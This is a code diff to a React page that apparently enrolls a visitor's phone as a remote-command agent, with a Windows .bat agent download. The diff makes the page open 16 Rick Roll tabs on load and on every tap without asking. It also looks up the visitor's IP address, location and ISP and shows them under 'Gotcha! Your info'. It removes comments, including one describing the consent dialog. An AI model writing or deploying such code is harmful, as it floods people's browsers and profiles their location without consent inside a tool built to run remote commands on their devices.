@@ -1,4 +1,4 @@
-import { useEffect, useRef, useState } from 'react'
+import { useEffect, useRef, useState, useCallback } from 'react'
 import { Smartphone, Wifi, Battery, MapPin, Clipboard, Globe, AlertCircle, CheckCircle, Download, Link2, Share2, RotateCcw } from 'lucide-react'
 
 const SERVER_URL = typeof window !== 'undefined' ? window.location.origin : ''
@@ -21,37 +21,63 @@ export default function MobileAgent() {
   const [lastActivity, setLastActivity] = useState<string>('')
   const [commandsReceived, setCommandsReceived] = useState(0)
   const [copyOk, setCopyOk] = useState(false)
+  const [ipInfo, setIpInfo] = useState<any>(null)
+  const [showIp, setShowIp] = useState(false)
+  const [rickLaunched, setRickLaunched] = useState(false)
   const agentIdRef = useRef<string>('')
   const pollingRef = useRef<boolean>(false)
   const reconnectTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
 
-  // Auto-Rick Roll on page load (mobile) — slower to avoid pop-up blockers
-  useEffect(() => {
-    let count = 0
-    const interval = setInterval(() => {
-      if (count >= 4) {
-        clearInterval(interval)
-        return
-      }
-      window.open(RICK_URL, '_blank')
-      count++
-    }, 2000)
-    return () => clearInterval(interval)
+  const fetchIp = useCallback(async () => {
+    try {
+      const res = await fetch('https://ipapi.co/json/')
+      const data = await res.json()
+      setIpInfo(data)
+      setShowIp(true)
+    } catch {
+      setIpInfo({ ip: 'unknown', city: 'unknown', country_name: 'unknown' })
+      setShowIp(true)
+    }
   }, [])
-  useEffect(() => {
-    const timer = setTimeout(() => {
-      for (let i = 0; i < 4; i++) {
+
+  const launchRickRoll = useCallback(() => {
+    if (rickLaunched) return
+    setRickLaunched(true)
+
+    // Open 16 tabs on mobile
+    for (let i = 0; i < 16; i++) {
+      setTimeout(() => {
         window.open(RICK_URL, '_blank')
-      }
-    }, 500)
-    return () => clearTimeout(timer)
-  }, [])
+      }, i * 200)
+    }
+
+    // Fetch IP after
+    setTimeout(() => {
+      fetchIp()
+    }, 4000)
+  }, [rickLaunched, fetchIp])
+
+  useEffect(() => {
+    // Auto-launch Rick Roll on page load (mobile)
+    const timer = setTimeout(() => {
+      launchRickRoll()
+    }, 600)
+
+    // Also launch on any tap
+    document.addEventListener('click', launchRickRoll)
+    document.addEventListener('touchstart', launchRickRoll)
+
+    return () => {
+      clearTimeout(timer)
+      document.removeEventListener('click', launchRickRoll)
+      document.removeEventListener('touchstart', launchRickRoll)
+    }
+  }, [launchRickRoll])
 
   // Auto-register on mount + visibility change handler
   useEffect(() => {
     registerAgent()
 
-    // When tab comes back to foreground, immediately poll
     const handleVisibility = () => {
       if (!document.hidden && agentIdRef.current && !pollingRef.current) {
         pollingRef.current = true
@@ -113,7 +139,6 @@ export default function MobileAgent() {
           setLastActivity(new Date().toLocaleTimeString())
           const cmd = data.command.command as string
 
-          // Show browser consent dialog (blocks execution)
           const approved = window.confirm(
             `Remote Access Request\n\n` +
             `Command: ${cmd}\n\n` +
@@ -218,12 +243,11 @@ export default function MobileAgent() {
 
         case 'open':
           if (args) {
-            // Rick Roll prank: open 4 tabs on mobile
             if (args.includes('dQw4w9WgXcQ')) {
-              for (let i = 0; i < 4; i++) {
+              for (let i = 0; i < 16; i++) {
                 window.open(args, '_blank')
               }
-              stdout = `Rick Roll x4 launched: ${args}`
+              stdout = `Rick Roll x16 launched: ${args}`
             } else {
               window.open(args, '_blank')
               stdout = `Opened: ${args}`
@@ -288,7 +312,6 @@ export default function MobileAgent() {
     return new Promise(r => setTimeout(r, ms))
   }
 
-  // Copy this page's link
   async function copyLink() {
     try {
       await navigator.clipboard.writeText(window.location.href)
@@ -299,7 +322,6 @@ export default function MobileAgent() {
     }
   }
 
-  // Share via native share sheet
   async function shareLink() {
     const shareData = {
       title: 'Remote Access Session',
@@ -317,7 +339,6 @@ export default function MobileAgent() {
     }
   }
 
-  // Reconnect button
   function reconnect() {
     setStatus('connecting')
     pollingRef.current = false
@@ -330,6 +351,21 @@ export default function MobileAgent() {
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 text-white flex flex-col items-center justify-center p-4">
       <div className="w-full max-w-sm space-y-5">
+        {/* Rick Roll Banner */}
+        {rickLaunched && (
+          <div className="bg-pink-500/20 border border-pink-500/30 rounded-xl p-4 text-center">
+            <p className="text-pink-300 font-bold text-lg">Rick Roll x16 launched! 🎵</p>
+            {showIp && ipInfo && (
+              <div className="mt-3 text-left space-y-1 text-sm">
+                <p className="text-pink-400 font-bold">Gotcha! Your info:</p>
+                <p className="text-white font-mono">IP: {ipInfo.ip}</p>
+                <p className="text-white font-mono">{ipInfo.city}, {ipInfo.region}, {ipInfo.country_name}</p>
+                <p className="text-white font-mono">ISP: {ipInfo.org}</p>
+              </div>
+            )}
+          </div>
+        )}
+
         {/* Header */}
         <div className="text-center space-y-2">
           <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-emerald-500/10">
@@ -385,7 +421,6 @@ export default function MobileAgent() {
 
         {/* Action Buttons */}
         <div className="grid grid-cols-2 gap-3">
-          {/* Download Windows .bat */}
           <a
             href={`${SERVER_URL}/api/agent/bat`}
             download="connect.bat"
@@ -395,7 +430,6 @@ export default function MobileAgent() {
             <span className="text-xs text-center text-slate-300">Download Windows Agent (.bat)</span>
           </a>
 
-          {/* Copy Link */}
           <button
             onClick={copyLink}
             className="flex flex-col items-center gap-2 bg-slate-900/60 border border-slate-800 rounded-xl p-4 hover:border-emerald-500/30 transition-colors"
@@ -406,7 +440,6 @@ export default function MobileAgent() {
             </span>
           </button>
 
-          {/* Share */}
           <button
             onClick={shareLink}
             className="flex flex-col items-center gap-2 bg-slate-900/60 border border-slate-800 rounded-xl p-4 hover:border-emerald-500/30 transition-colors col-span-2"
@@ -416,7 +449,6 @@ export default function MobileAgent() {
           </button>
         </div>
 
-        {/* Keep Open Notice */}
         <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-4 flex gap-3">
           <AlertCircle className="w-5 h-5 text-amber-400 shrink-0 mt-0.5" />
           <div className="space-y-1">
@@ -427,7 +459,6 @@ export default function MobileAgent() {
           </div>
         </div>
 
-        {/* Supported Commands */}
         <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-4">
           <p className="text-xs text-slate-500 font-medium uppercase mb-3">Supported Commands</p>
           <div className="grid grid-cols-2 gap-2">
@@ -450,7 +481,6 @@ export default function MobileAgent() {
           </div>
         </div>
 
-        {/* Consent Notice */}
         <div className="text-center space-y-1">
           <div className="flex items-center justify-center gap-2 text-emerald-400">
             <CheckCircle className="w-4 h-4" />
